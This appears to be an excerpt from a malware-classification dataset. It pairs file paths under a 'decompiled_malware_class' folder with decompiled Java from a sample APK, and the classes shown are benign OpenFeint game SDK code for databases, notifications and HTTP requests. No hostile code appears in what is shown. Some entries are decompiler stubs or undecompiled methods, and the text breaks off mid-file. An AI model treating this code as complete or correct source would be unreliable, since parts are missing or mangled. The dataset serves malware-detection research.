db.setVersion(this.mNewVersion);             db.setTransactionSuccessful();           }   finally {             db.endTransaction();           }         }         if (1 != 0) {           if (this.mDatabase != null) {             try {               this.mDatabase.close();             }  catch (            Exception e) {             }           }           this.mDatabase=db;         }  else         if (db != null) {           db.close();         }         sQLiteDatabase=db;       }  catch (      Throwable th) {         if (0 != 0) {           if (this.mDatabase != null) {             try {               this.mDatabase.close();             }  catch (            Exception e2) {             }           }           this.mDatabase=db;         }  else         if (db != null) {           db.close();         }         throw th;       }     }     return sQLiteDatabase;   }   public synchronized SQLiteDatabase getReadableDatabase(){     SQLiteDatabase sQLiteDatabase;     if (this.mHelper != null) {       sQLiteDatabase=this.mHelper.getReadableDatabase();     }  else     if (this.mDatabase != null && this.mDatabase.isOpen()) {       sQLiteDatabase=this.mDatabase;     }  else {       try {         sQLiteDatabase=getWritableDatabase();       }  catch (      SQLiteException e) {         if (this.mName == null) {           throw e;         }         Log.e(TAG,""Couldn't open "" + this.mName + "" for writing (will try read-only):"",e);         SQLiteDatabase db=null;         try {           SQLiteDatabase db2=SQLiteDatabase.openDatabase(this.mName,null,1);           if (db2.getVersion() != this.mNewVersion) {             throw new SQLiteException(""Can't upgrade read-only database from version "" + db2.getVersion() + "" to ""+ this.mNewVersion+ "": ""+ this.mName);           }           Log.w(TAG,""Opened "" + this.mName + "" in read-only mode"");           this.mDatabase=db2;           sQLiteDatabase=this.mDatabase;           if (db2 != null && db2 != this.mDatabase) {             db2.close();           }         }  catch (        Throwable th) {           if (0 != 0 && null != this.mDatabase) {             db.close();           }           throw th;         }       }     }     return sQLiteDatabase;   }   public synchronized void close(){     if (this.mDatabase != null && this.mDatabase.isOpen()) {       this.mDatabase.close();       this.mDatabase=null;     }     if (this.mHelper != null) {       this.mHelper.close();     }   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.notifications\AchievementNotification.code","public class AchievementNotification extends NotificationBase {   protected AchievementNotification(  Achievement achievement,  Map<String,Object> userData){     super(OpenFeintInternal.getRString(R.string.of_achievement_unlocked),null,Notification.Category.Achievement,Notification.Type.Success,userData);   }   public void loadedImage(  Bitmap map){     this.displayView.invalidate();   }   @Override protected boolean createView(){     String rString;     final Achievement achievement=(Achievement)getUserData().get(""achievement"");     LayoutInflater inflater=(LayoutInflater)OpenFeintInternal.getInstance().getContext().getSystemService(""layout_inflater"");     this.displayView=inflater.inflate(R.layout.of_achievement_notification,(ViewGroup)null);     if (achievement.isUnlocked) {       this.displayView.findViewById(R.id.of_achievement_progress_icon).setVisibility(4);       if (achievement.gamerscore == 0) {         this.displayView.findViewById(R.id.of_achievement_score_icon).setVisibility(4);         this.displayView.findViewById(R.id.of_achievement_score).setVisibility(4);       }     }  else {       this.displayView.findViewById(R.id.of_achievement_score_icon).setVisibility(4);     }     TextView textView=(TextView)this.displayView.findViewById(R.id.of_achievement_text);     if (achievement.title != null && achievement.title.length() > 0) {       rString=achievement.title;     }  else {       rString=OpenFeintInternal.getRString(R.string.of_achievement_unlocked);     }     textView.setText(rString);     String scoreText=achievement.isUnlocked ? Integer.toString(achievement.gamerscore) : String.format(""%d%%"",Integer.valueOf((int)achievement.percentComplete));     ((TextView)this.displayView.findViewById(R.id.of_achievement_score)).setText(scoreText);     if (achievement.iconUrl != null) {       Drawable iconImage=getResourceDrawable(achievement.iconUrl);       if (iconImage == null) {         BitmapRequest req=new ExternalBitmapRequest(achievement.iconUrl){           @Override public void onSuccess(          Bitmap responseBody){             ((ImageView)AchievementNotification.this.displayView.findViewById(R.id.of_achievement_icon)).setImageDrawable(new BitmapDrawable(responseBody));             AchievementNotification.this.showToast();           }           @Override public void onFailure(          String exceptionMessage){             OpenFeintInternal.log(""NotificationImage"",""Failed to load image "" + achievement.iconUrl + "":""+ exceptionMessage);             AchievementNotification.this.showToast();           }         } ;         req.launch();         return false;       }       ((ImageView)this.displayView.findViewById(R.id.of_achievement_icon)).setImageDrawable(iconImage);     }     return true;   }   @Override protected void drawView(  Canvas canvas){     this.displayView.draw(canvas);   }   public static void showStatus(  Achievement achievement){     Map<String,Object> userData=new HashMap<>();     userData.put(""achievement"",achievement);     AchievementNotification notification=new AchievementNotification(achievement,userData);     notification.checkDelegateAndView();   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.notifications\NotificationBase.code","public abstract class NotificationBase extends Notification {   static Map<String,Drawable> drawableCache=new HashMap();   private Notification.Category category;   View displayView;   protected String imageName;   private String text;   Toast toast;   private Notification.Type type;   private Map<String,Object> userData;   protected abstract boolean createView();   protected abstract void drawView(  Canvas canvas);   @Override public String getText(){     return this.text;   }   @Override public Notification.Category getCategory(){     return this.category;   }   @Override public Notification.Type getType(){     return this.type;   }   @Override public Map<String,Object> getUserData(){     return this.userData;   }   public NotificationBase(  String _text,  String _imageName,  Notification.Category _cat,  Notification.Type _type,  Map<String,Object> _userData){     this.text=_text;     this.imageName=_imageName;     this.category=_cat;     this.type=_type;     this.userData=_userData;   }   protected String clippedText(  Paint paint,  String text,  int length){     int endLength=paint.breakText(text,true,length,null);     if (endLength >= text.length()) {       return text;     }     String outText=String.valueOf(text.substring(0,endLength - 1)) + ""..."";     return outText;   }   public void showToast(){     OpenFeintInternal.getInstance().runOnUiThread(new Runnable(){       @Override public void run(){         Context appContext=OpenFeintInternal.getInstance().getContext();         NotificationBase.this.toast=new Toast(appContext);         NotificationBase.this.toast.setGravity(80,0,0);         NotificationBase.this.toast.setDuration(1);         NotificationBase.this.toast.setView(NotificationBase.this.displayView);         NotificationBase.this.toast.show();       }     } );   }   public static Drawable getResourceDrawable(  String name){     if (!drawableCache.containsKey(name)) {       OpenFeintInternal ofi=OpenFeintInternal.getInstance();       int bitmapHandle=ofi.getResource(name);       if (bitmapHandle == 0) {         drawableCache.put(name,null);       }  else {         Resources r=ofi.getContext().getResources();         drawableCache.put(name,r.getDrawable(bitmapHandle));       }     }     return drawableCache.get(name);   }   public void checkDelegateAndView(){     if (getDelegate().canShowNotification(this)) {       getDelegate().notificationWillShow(this);       if (createView()) {         showToast();         return;       }       return;     }     getDelegate().displayNotification(this);   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.notifications\SimpleNotification.code","public class SimpleNotification extends NotificationBase {   protected SimpleNotification(  String text,  String imageName,  Notification.Category cat,  Notification.Type type,  Map<String,Object> userData){     super(text,imageName,cat,type,userData);   }   @Override protected boolean createView(){     LayoutInflater inflater=(LayoutInflater)OpenFeintInternal.getInstance().getContext().getSystemService(""layout_inflater"");     this.displayView=inflater.inflate(R.layout.of_simple_notification,(ViewGroup)null);     ((TextView)this.displayView.findViewById(R.id.of_text)).setText(getText());     final ImageView icon=(ImageView)this.displayView.findViewById(R.id.of_icon);     if (this.imageName != null) {       Drawable image=getResourceDrawable(this.imageName);       if (image == null) {         BitmapRequest req=new BitmapRequest(){           @Override public String path(){             return SimpleNotification.this.imageName;           }           @Override public void onSuccess(          Bitmap responseBody){             icon.setImageDrawable(new BitmapDrawable(responseBody));             SimpleNotification.this.showToast();           }           @Override public void onFailure(          String exceptionMessage){             OpenFeintInternal.log(""NotificationImage"",""Failed to load image "" + SimpleNotification.this.imageName + "":""+ exceptionMessage);             icon.setVisibility(4);             SimpleNotification.this.showToast();           }         } ;         req.launch();         return false;       }       icon.setImageDrawable(image);     }  else {       icon.setVisibility(4);     }     return true;   }   @Override protected void drawView(  Canvas canvas){     this.displayView.draw(canvas);   }   public static void show(  String text,  Notification.Category c,  Notification.Type t){     show(text,null,c,t);   }   public static void show(  String text,  String imageName,  Notification.Category c,  Notification.Type t){     SimpleNotification notification=new SimpleNotification(text,imageName,c,t,null);     notification.checkDelegateAndView();   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.notifications\TwoLineNotification.code","public class TwoLineNotification extends NotificationBase {   protected TwoLineNotification(  String text,  String extra,  String imageName,  Notification.Category cat,  Notification.Type type,  Map<String,Object> userData){     super(text,imageName,cat,type,userData);   }   @Override protected boolean createView(){     LayoutInflater inflater=(LayoutInflater)OpenFeintInternal.getInstance().getContext().getSystemService(""layout_inflater"");     this.displayView=inflater.inflate(R.layout.of_two_line_notification,(ViewGroup)null);     ((TextView)this.displayView.findViewById(R.id.of_text1)).setText(getText());     ((TextView)this.displayView.findViewById(R.id.of_text2)).setText((String)getUserData().get(""extra""));     final ImageView icon=(ImageView)this.displayView.findViewById(R.id.of_icon);     if (this.imageName != null) {       Drawable image=getResourceDrawable(this.imageName);       if (image == null) {         BitmapRequest req=new BitmapRequest(){           @Override public String path(){             return TwoLineNotification.this.imageName;           }           @Override public void onSuccess(          Bitmap responseBody){             icon.setImageDrawable(new BitmapDrawable(responseBody));             TwoLineNotification.this.showToast();           }           @Override public void onFailure(          String exceptionMessage){             OpenFeintInternal.log(""NotificationImage"",""Failed to load image "" + TwoLineNotification.this.imageName + "":""+ exceptionMessage);             icon.setVisibility(4);             TwoLineNotification.this.showToast();           }         } ;         req.launch();         return false;       }       icon.setImageDrawable(image);     }  else {       icon.setVisibility(4);     }     return true;   }   @Override protected void drawView(  Canvas canvas){     this.displayView.draw(canvas);   }   public static void show(  String text,  String extra,  Notification.Category c,  Notification.Type t){     show(text,extra,null,c,t);   }   public static void show(  String text,  String extra,  String imageName,  Notification.Category c,  Notification.Type t){     Map<String,Object> userData=new HashMap<>();     userData.put(""extra"",extra);     TwoLineNotification notification=new TwoLineNotification(text,extra,imageName,c,t,userData);     notification.checkDelegateAndView();   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.offline\DB.code","!org.eclipse.jdt.core.dom.TypeDeclaration@6b6371a0"
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.offline\OfflineAchievement.code","public static class OfflineAchievement {   public float clientCompletionPercentage;   public String resourceID;   public float serverCompletionPercentage;   public String timestamp;   public OfflineAchievement dup(){     OfflineAchievement rv=new OfflineAchievement();     rv.resourceID=this.resourceID;     rv.clientCompletionPercentage=this.clientCompletionPercentage;     rv.serverCompletionPercentage=this.serverCompletionPercentage;     rv.timestamp=this.timestamp;     return rv;   }   public boolean eq(  OfflineAchievement rhs){     return OfflineSupport.streq(this.resourceID,rhs.resourceID) && this.clientCompletionPercentage == rhs.clientCompletionPercentage && this.serverCompletionPercentage == rhs.serverCompletionPercentage && OfflineSupport.streq(this.timestamp,rhs.timestamp);   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.offline\OfflineScore.code","public static class OfflineScore {   public String blobFileName;   public String customData;   public String displayText;   public String leaderboardID;   public long score;   public String timestamp;   public OfflineScore dup(){     OfflineScore rv=new OfflineScore();     rv.leaderboardID=this.leaderboardID;     rv.score=this.score;     rv.displayText=this.displayText;     rv.customData=this.customData;     rv.blobFileName=this.blobFileName;     rv.timestamp=this.timestamp;     return rv;   }   public boolean eq(  OfflineScore rhs){     return OfflineSupport.streq(this.leaderboardID,rhs.leaderboardID) && this.score == rhs.score && OfflineSupport.streq(this.displayText,rhs.displayText) && OfflineSupport.streq(this.customData,rhs.customData) && OfflineSupport.streq(this.blobFileName,rhs.blobFileName) && OfflineSupport.streq(this.timestamp,rhs.timestamp);   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.offline\OfflineSupport.code","!org.eclipse.jdt.core.dom.TypeDeclaration@1092e39b"
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.request\BaseRequest.code","public abstract class BaseRequest {   private static int DEFAULT_RETRIES=2;   private static long DEFAULT_TIMEOUT=20000;   protected static String TAG=""Request"";   private static String sBaseServerURL=null;   protected OrderedArgList mArgs;   private HttpUriRequest mRequest;   private byte[] mResponseBody;   private int mResponseCode;   private long mSecondsSinceEpoch;   private HttpResponse response_;   private boolean mResponded=false;   private String mResponseEncoding=null;   private String mResponseType=null;   private String mSignature=null;   private String mKey=null;   private int mRetriesLeft=0;   private String mCurrentURL=null;   private Future<?> mFuture=null;   private HttpParams mHttpParams=null;   public abstract String method();   public abstract void onResponse(  int i,  byte[] bArr);   public abstract String path();   protected String getResponseEncoding(){     return this.mResponseEncoding;   }   public String getResponseType(){     return this.mResponseType;   }   public int numRetries(){     return DEFAULT_RETRIES;   }   public long timeout(){     return DEFAULT_TIMEOUT;   }   public String currentURL(){     return this.mCurrentURL != null ? this.mCurrentURL : url();   }   public void setFuture(  Future<?> future){     this.mFuture=future;   }   public Future<?> getFuture(){     return this.mFuture;   }   public HttpParams getHttpParams(){     if (this.mHttpParams == null) {       this.mHttpParams=new BasicHttpParams();     }     return this.mHttpParams;   }   public boolean wantsLogin(){     return false;   }   public boolean signed(){     return true;   }   public boolean needsDeviceSession(){     return signed();   }   public BaseRequest(){   }   public BaseRequest(  OrderedArgList args){     setArgs(args);   }   public String url(){     if (sBaseServerURL == null) {       sBaseServerURL=OpenFeintInternal.getInstance().getServerUrl();     }     return String.valueOf(sBaseServerURL) + path();   }   public final void sign(  Signer authority){     if (this.mArgs == null) {       this.mArgs=new OrderedArgList();     }     if (signed()) {       this.mSecondsSinceEpoch=System.currentTimeMillis() / 1000;       this.mSignature=authority.sign(path(),method(),this.mSecondsSinceEpoch,this.mArgs);       this.mKey=authority.getKey();     }   }   public final void setArgs(  OrderedArgList args){     this.mArgs=args;   }   protected HttpEntity genEntity() throws UnsupportedEncodingException {     UrlEncodedFormEntity entity=new UrlEncodedFormEntity(this.mArgs.getArgs(),""UTF-8"");     entity.setContentType(""application/x-www-form-urlencoded; charset=UTF-8"");     return entity;   }   public HttpUriRequest generateRequest(){     HttpEntityEnclosingRequestBase postReq;     HttpUriRequest retval=null;     String meth=method();     if (meth.equals(""GET"") || meth.equals(""DELETE"")) {       String url=url();       String argString=this.mArgs.getArgString();       if (argString != null) {         url=String.valueOf(url) + ""?"" + argString;       }       if (meth.equals(""GET"")) {         retval=new HttpGet(url);       }  else       if (meth.equals(""DELETE"")) {         retval=new HttpDelete(url);       }     }  else {       if (meth.equals(""POST"")) {         postReq=new HttpPost(url());       }  else {         if (!meth.equals(""PUT"")) {           throw new RuntimeException(""Unsupported HTTP method: "" + meth);         }         postReq=new HttpPut(url());       }       try {         postReq.setEntity(genEntity());       }  catch (      UnsupportedEncodingException e) {         OpenFeintInternal.log(TAG,""Unable to encode request."");         e.printStackTrace(System.err);       }       retval=postReq;     }     if (signed() && this.mSignature != null && this.mKey != null) {       retval.addHeader(""X-OF-Signature"",this.mSignature);       retval.addHeader(""X-OF-Key"",this.mKey);     }     addParams(retval);     return retval;   }   protected boolean shouldRedirect(  String url){     return true;   }   public final void addParams(  HttpUriRequest retval){     if (this.mHttpParams != null) {       retval.setParams(this.mHttpParams);     }   }   public final void exec(  boolean r13){     throw new UnsupportedOperationException(""Method not decompiled: com.openfeint.internal.request.BaseRequest.exec(boolean):void"");   }   private void fakeServerException(  ServerException se){     this.mResponseCode=0;     this.mResponseBody=se.generate().getBytes();     this.mResponseType=JSONContentRequest.DESIRED_RESPONSE_PREFIX;   }   public HttpResponse getResponse(){     return this.response_;   }   protected void onResponseOffMainThread(  int responseCode,  byte[] body){   }   public final void onResponse(){     if (!this.mResponded) {       this.mResponded=true;       if (this.mResponseBody == null) {         this.mResponseCode=0;         ServerException se=new ServerException();         se.exceptionClass=""Unknown"";         se.message=OpenFeintInternal.getRString(R.string.of_unknown_server_error);         fakeServerException(se);       }       onResponse(this.mResponseCode,this.mResponseBody);       this.response_=null;     }   }   public void launch(){     OpenFeintInternal.makeRequest(this);   }   public void postTimeoutCleanup(){     final HttpUriRequest req=this.mRequest;     this.mRequest=null;     if (req != null) {       new Thread(new Runnable(){         @Override public void run(){           try {             req.abort();           }  catch (          UnsupportedOperationException e) {           }         }       } ).start();     }     ServerException se=new ServerException();     se.exceptionClass=""Timeout"";     se.message=OpenFeintInternal.getRString(R.string.of_timeout);     fakeServerException(se);   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.request\BitmapRequest.code","public abstract class BitmapRequest extends DownloadRequest {   public void onSuccess(  Bitmap responseBody){   }   @Override protected void onSuccess(  byte[] body){     Bitmap b=BitmapFactory.decodeByteArray(body,0,body.length);     if (b != null) {       onSuccess(b);     }  else {       onFailure(OpenFeintInternal.getRString(R.string.of_bitmap_decode_error));     }   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.request\BlobPostRequest.code","public class BlobPostRequest extends BaseRequest {   String mContentType;   private IRawRequestDelegate mDelegate;   BlobUploadParameters mParams;   protected PartSource mPartSource;   @Override public boolean signed(){     return false;   }   @Override public String method(){     return ""POST"";   }   @Override public String url(){     return this.mParams.action;   }   public void sign(){   }   @Override public String path(){     return """";   }   @Override public HttpUriRequest generateRequest(){     if (this.mPartSource == null) {       return null;     }     HttpPost retval=new HttpPost(url());     Part[] parts=new Part[6];     int idx=0 + 1;     parts[0]=new StringPart(""AWSAccessKeyId"",this.mParams.AWSAccessKeyId);     int idx2=idx + 1;     parts[idx]=new StringPart(""acl"",this.mParams.acl);     int idx3=idx2 + 1;     parts[idx2]=new StringPart(""key"",this.mParams.key);     int idx4=idx3 + 1;     parts[idx3]=new StringPart(""policy"",this.mParams.policy);     int idx5=idx4 + 1;     parts[idx4]=new StringPart(""signature"",this.mParams.signature);     int i=idx5 + 1;     parts[idx5]=new FilePart(""file"",this.mPartSource,this.mContentType,(String)null);     HttpEntity e=new MultipartHttpEntity(parts);     retval.setEntity(e);     addParams(retval);     return retval;   }   public BlobPostRequest(  BlobUploadParameters params,  PartSource partSource,  String contentType){     super(null);     this.mParams=params;     this.mPartSource=partSource;     this.mContentType=contentType;   }   @Override public void onResponse(  int responseCode,  byte[] body){     if (this.mDelegate != null) {       this.mDelegate.onResponse(responseCode,new String(body));     }   }   public void setDelegate(  IRawRequestDelegate mDelegate){     this.mDelegate=mDelegate;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.request\CacheFileRequest.code","public class CacheFileRequest extends CacheRequest {   private static final String TAG=""CacheFile"";   protected String path;   protected String url;   public CacheFileRequest(  String path,  String url,  String key){     super(key);     this.path=path;     this.url=url;   }   @Override public void onResponse(  int responseCode,  byte[] body){     if (responseCode == 200) {       try {         Util.saveFile(body,this.path);         super.on200Response();       }  catch (      Exception e) {         OpenFeintInternal.log(TAG,e.toString());       }     }   }   @Override public String path(){     return this.url;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.request\CacheRequest.code","public abstract class CacheRequest extends BaseRequest {   private static final String IF_MODIFIED_SINCE=""If-Modified-Since"";   private static final String LastModified=""Last-Modified"";   private static final String TAG=""CacheRequest"";   private String key_;   public CacheRequest(  String key){     this.key_=key;   }   @Override public String method(){     return ""GET"";   }   @Override public HttpUriRequest generateRequest(){     HttpUriRequest req=super.generateRequest();     String date=getLastModified();     if (date != null) {       req.addHeader(IF_MODIFIED_SINCE,date);     }     return req;   }   private String getLastModified(){     Cursor result=null;     String value=null;     try {       SQLiteDatabase db=DB.storeHelper.getReadableDatabase();       String[] key={this.key_};       result=db.rawQuery(""SELECT VALUE FROM store where id=?"",key);       if (result.getCount() > 0) {         result.moveToFirst();         value=result.getString(0);       }       db.close();     }  catch (    SQLiteDiskIOException e) {       WebViewCache.diskError();     } catch (    Exception e2) {       OpenFeintInternal.log(TAG,e2.getMessage());     }     if (result != null) {       result.close();     }     return value;   }   private void storeLastModified(  String value){     if (value != null) {       String[] values={this.key_,value};       try {         SQLiteDatabase db=DB.storeHelper.getWritableDatabase();         db.execSQL(""INSERT OR REPLACE INTO store VALUES(?, ?)"",values);         db.close();       }  catch (      SQLiteDiskIOException e) {         WebViewCache.diskError();       } catch (      Exception e2) {         OpenFeintInternal.log(TAG,e2.getMessage());       }     }   }   public void updateLastModifiedFromResponse(  HttpResponse response){     Header h=response != null ? response.getFirstHeader(LastModified) : null;     if (h != null) {       storeLastModified(h.getValue());     }   }   public void on200Response(){     updateLastModifiedFromResponse(getResponse());   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.request\Client.code","public class Client extends DefaultHttpClient {   private static final int EXCESS_THREAD_LIFETIME=30;   private static final int MAX_THREADS=4;   private static final int MIN_THREADS=2;   private static final String TAG=""HTTPClient"";   private CookieStore mCookieStore;   final ExecutorService mExecutor;   private boolean mForceOffline;   private Handler mMainThreadHandler;   private Signer mSigner;   public void saveInstanceState(  Bundle outState){     this.mCookieStore.saveInstanceState(outState);     outState.putBoolean(""mForceOffline"",this.mForceOffline);   }   public void restoreInstanceState(  Bundle inState){     this.mCookieStore.restoreInstanceState(inState);     this.mForceOffline=inState.getBoolean(""mForceOffline"");   }   public boolean toggleForceOffline(){     if (this.mForceOffline) {       this.mForceOffline=false;       OpenFeintInternal.log(TAG,""forceOffline = FALSE"");     }  else {       this.mForceOffline=true;       OpenFeintInternal.log(TAG,""forceOffline = TRUE"");     }     return this.mForceOffline;   } private static class GzipDecompressingEntity extends HttpEntityWrapper {     public GzipDecompressingEntity(    HttpEntity entity){       super(entity);     }     @Override public InputStream getContent() throws IOException, IllegalStateException {       InputStream wrappedin=this.wrappedEntity.getContent();       return new GZIPInputStream(wrappedin);     }     @Override public long getContentLength(){       return -1L;     }   }   static final ClientConnectionManager makeCCM(){     SchemeRegistry sr=new SchemeRegistry();     sr.register(new Scheme(""http"",PlainSocketFactory.getSocketFactory(),80));     sr.register(new Scheme(""https"",SSLSocketFactory.getSocketFactory(),443));     ClientConnectionManager ccm=new ThreadSafeClientConnManager(new BasicHttpParams(),sr);     return ccm;   } private final class Executor extends ThreadPoolExecutor {     Executor(){       super(2,4,30L,TimeUnit.SECONDS,new LinkedBlockingQueue(),new RejectedExecutionHandler(){         @Override public void rejectedExecution(        Runnable arg0,        ThreadPoolExecutor arg1){           OpenFeintInternal.log(Client.TAG,""Can't submit runnable "" + arg0.toString());         }       } );     }   }   public Client(  String key,  String secret,  SyncedStore prefs){     super(makeCCM(),new BasicHttpParams());     this.mExecutor=new Executor();     this.mSigner=new Signer(key,secret);     this.mMainThreadHandler=new Handler();     this.mCookieStore=new CookieStore(prefs);     setCookieStore(this.mCookieStore);     addRequestInterceptor(new HttpRequestInterceptor(){       @Override public void process(      HttpRequest request,      HttpContext context) throws HttpException, IOException {         if (!request.containsHeader(""Accept-Encoding"")) {           request.addHeader(""Accept-Encoding"",""gzip"");         }       }     } );     addResponseInterceptor(new HttpResponseInterceptor(){       @Override public void process(      HttpResponse response,      HttpContext context) throws HttpException, IOException {         Header ceheader;         HeaderElement[] codecs;         HttpEntity entity=response.getEntity();         if (entity != null && (ceheader=entity.getContentEncoding()) != null && (codecs=ceheader.getElements()) != null) {           for (          HeaderElement headerElement : codecs) {             if (headerElement.getName().equalsIgnoreCase(""gzip"")) {               response.setEntity(new GzipDecompressingEntity(response.getEntity()));               return;             }           }         }       }     } );   }   public final void makeRequest(  BaseRequest req){     makeRequest(req,req.timeout());   }   public final void makeRequest(  final BaseRequest req,  final long timeoutMillis){     final Runnable onResponse=new Runnable(){       @Override public void run(){         req.onResponse();       }     } ;     final Runnable onTimeout=new Runnable(){       @Override public void run(){         if (req.getResponse() == null) {           boolean victory=req.getFuture().cancel(true);           if (victory) {             req.postTimeoutCleanup();             Client.this.mMainThreadHandler.post(onResponse);           }         }       }     } ;     Runnable requestRunnable=new Runnable(){       @Override public void run(){         Client.this.mMainThreadHandler.postDelayed(onTimeout,timeoutMillis);         req.sign(Client.this.mSigner);         req.exec(Client.this.mForceOffline);         Client.this.mMainThreadHandler.removeCallbacks(onTimeout);         Client.this.mMainThreadHandler.post(onResponse);       }     } ;     req.setFuture(this.mExecutor.submit(requestRunnable));   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.request\CompressedBlobDownloadRequest.code","public abstract class CompressedBlobDownloadRequest extends DownloadRequest {   protected abstract void onSuccessDecompress(  byte[] bArr);   @Override protected final void onSuccess(  byte[] body){     try {       onSuccessDecompress(Compression.decompress(body));     }  catch (    IOException e) {       onFailure(OpenFeintInternal.getRString(R.string.of_io_exception_on_download));     }   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.request\CompressedBlobPostRequest.code","public class CompressedBlobPostRequest extends BlobPostRequest {   String mFilename;   BlobUploadParameters mParameters;   byte mUncompressedData;   public CompressedBlobPostRequest(  BlobUploadParameters parameters,  String filename,  byte[] uncompressedData){     super(parameters,new ByteArrayPartSource(filename,Compression.compress(uncompressedData)),FilePart.DEFAULT_CONTENT_TYPE);   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.request\Compression.code","!org.eclipse.jdt.core.dom.TypeDeclaration@57ee4fe7"
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.request\DownloadRequest.code","public abstract class DownloadRequest extends BaseRequest {   protected abstract void onSuccess(  byte[] bArr);   public DownloadRequest(){   }   public DownloadRequest(  OrderedArgList args){     super(args);   }   @Override public String method(){     return ""GET"";   }   public void onFailure(  String exceptionMessage){     OpenFeintInternal.log(""ServerException"",exceptionMessage);   }   @Override public void onResponse(  int responseCode,  byte[] body){     String exceptionMessage=OpenFeintInternal.getRString(R.string.of_unknown_server_error);     if (200 <= responseCode && responseCode < 300 && body != null) {       onSuccess(body);       return;     }     if (404 == responseCode) {       exceptionMessage=OpenFeintInternal.getRString(R.string.of_file_not_found);     }  else {       try {         JsonFactory jsonFactory=new JsonFactory();         JsonParser jp=jsonFactory.createJsonParser(body);         JsonResourceParser jrp=new JsonResourceParser(jp);         Object responseBody=jrp.parse();         if (responseBody != null && (responseBody instanceof ServerException)) {           ServerException e=(ServerException)responseBody;           exceptionMessage=String.valueOf(e.exceptionClass) + "": "" + e.message;         }       }  catch (      IOException e2) {         exceptionMessage=OpenFeintInternal.getRString(R.string.of_error_parsing_error_message);       }     }     onFailure(exceptionMessage);   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.request\Executor.code","private final class Executor extends ThreadPoolExecutor {   Executor(){     super(2,4,30L,TimeUnit.SECONDS,new LinkedBlockingQueue(),new RejectedExecutionHandler(){       @Override public void rejectedExecution(      Runnable arg0,      ThreadPoolExecutor arg1){         OpenFeintInternal.log(Client.TAG,""Can't submit runnable "" + arg0.toString());       }     } );   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.request\ExternalBitmapRequest.code","public class ExternalBitmapRequest extends BitmapRequest {   private String mURL;   public ExternalBitmapRequest(  String url){     this.mURL=url;   }   @Override public boolean signed(){     return false;   }   @Override public String url(){     return this.mURL;   }   @Override public String path(){     return """";   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.openfeint.internal.request\GenericRequest.code","public class GenericRequest extends JSONContentRequest {   private IRawRequestDelegate mDelegate;   final String mMethod;   final String mPath;   private int mRetries;   private long mTimeout;   @Override public long timeout(){     return this.mTimeout;   }   @Override public int numRetries(){     return this.mRetries;   }   public GenericRequest(  String path,  String method,  Map<String,Object> args,  Map<String,Object> httpParams,  IRawRequestDelegate delegate){     this.mTimeout=super.timeout();     this.mRetries=super.numRetries();     if (httpParams != null) {       for (      Map.Entry<String,Object> e : httpParams.entrySet()) {         String k=e.getKey();         String v=e.getValue().toString();         int i=Integer.parseInt(v);         if (k.equals(""connectionTimeout"")) {           HttpConnectionParams.setConnectionTimeout(getHttpParams(),i);         }  else         if (k.equals(""socketTimeout"")) {           HttpConnectionParams.setSoTimeout(getHttpParams(),i);         }  else         if (k.equals(""lingerTimeout"")) {           HttpConnectionParams.setLinger(getHttpParams(),i);         }  else         if (k.equals(""timeout"")) {           this.mTimeout=i;         }  else         if (k.equals(""retries"")) {           this.mRetries=i;         }       }     }     OrderedArgList argList=new OrderedArgList(args);     argList.put(""format"",""json"");     setArgs(argList);     this.mMethod=method;     this.mPath=path;     setDelegate(delegate);   }   @Override public String method(){     return this.mMethod;   }   @Override public String path(){     return this.mPath;   }   @Override public void onResponse(  int responseCode,  byte[] body){     String respText;     try {       if (!isResponseJSON()) {         respText=notJSONError(responseCode).generate();       }  else {         respText=body != null ? new String(body) : """";       }       if (this.mDelegate != null) {         this.mDelegate.onResponse(responseCode,respText);       }     }  catch (    IllegalStateException e) {       e.printStackTrace();     }   }   public void setDelegate(  